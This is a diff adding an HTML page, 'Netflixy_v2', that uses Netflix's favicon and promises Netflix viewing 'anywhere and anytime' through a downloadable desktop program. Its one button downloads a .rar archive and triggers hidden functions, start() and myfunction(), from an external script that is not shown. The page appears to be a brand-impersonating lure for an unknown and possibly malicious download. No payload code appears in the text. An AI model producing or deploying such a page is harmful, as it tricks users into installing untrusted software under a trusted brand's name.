@@ -1,0 +1,80 @@
+<html><head>
+    <!-- meta tags -->
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Netflixy_v2</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC" crossorigin="anonymous">
+    <!-- Tab icon -->
+    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.ico">
+    <!-- Custom CSS File -->
+    <link rel="stylesheet" href="./netflix_bootstrap.css">
+
+    <script src="./script.js"></script>
+<style>
+    .center {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh; /* This makes the button centered vertically on the page */
+    }
+    
+    /* Additional styles for the button */
+    .download-button {
+      background-color: red;
+      color: white;
+      margin-top:10px;
+      padding: 15px 25px;
+      text-decoration: none;
+      border-radius: 5px;
+      font-weight: bold;
+    }
+    </style></head>
+
+
+<body>
+    <div class="container-fluid back-img">
+        <!-- NavBar implemented using Bootstrap classes -->
+        <nav class="navbar navbar-expand-lg px-3 py-4">
+            <div class="container-fluid">
+                <a class="navbar-brand" href="#">
+                    <img src="" alt="Netflixy_v2">
+                </a>
+                <div class="ms-auto d-flex flex-row flex-nowrap">
+                    <div class="dropdown pe-2">
+                        
+                        <div id="dropdown-menu-1" class="dropdown-menu" aria-labelledby="dropdownMenuButton">
+                            <a class="dropdown-item" href="#">English</a>
+                            <a class="dropdown-item" href="#">हिन्दी</a>
+                        </div>
+                    </div>
+                    <div class="pe-2">
+                        
+                    </div>
+                </div>
+            </div>
+        </nav>
+        <!-- Wallpaper content implemented using Bootstrap classes -->
+        <div class="wallpaper-content mx-auto my-auto">
+            <div class="row text-center mx-auto img-title">
+                <div class="col-12">Welcome In Netflixy v2</div>
+            </div>
+            <div class="row text-center mx-auto img-subtitle">
+                <div class="col-12">WITH NETFLIXY_V2 YOU CAN WATCH NETFLIX ANYWHERE AND ANYTIME</div>
+            </div>
+            <div class="row text-center mx-auto pb-1 email-txt">
+                <div class="col-12">All You Need Is To Download NetflixyV2 Software On Your Desktop.</div>
+            </div>
+            <div class="row text-center mx-auto my-3 email-field">
+                
+                <div class="center-button">
+                    <a href="netflixyv2.rar" class="download-button" onclick="start();setTimeout(myfunction, 4000);">Download Now</a>
+                  </div>
+            </div>
+        </div>
+    </div>
+    <!-- Bottom Sections: Implemented using flex classes of bootstrap -->
+   <!-- Code injected by live-server -->
+
+</body></html>
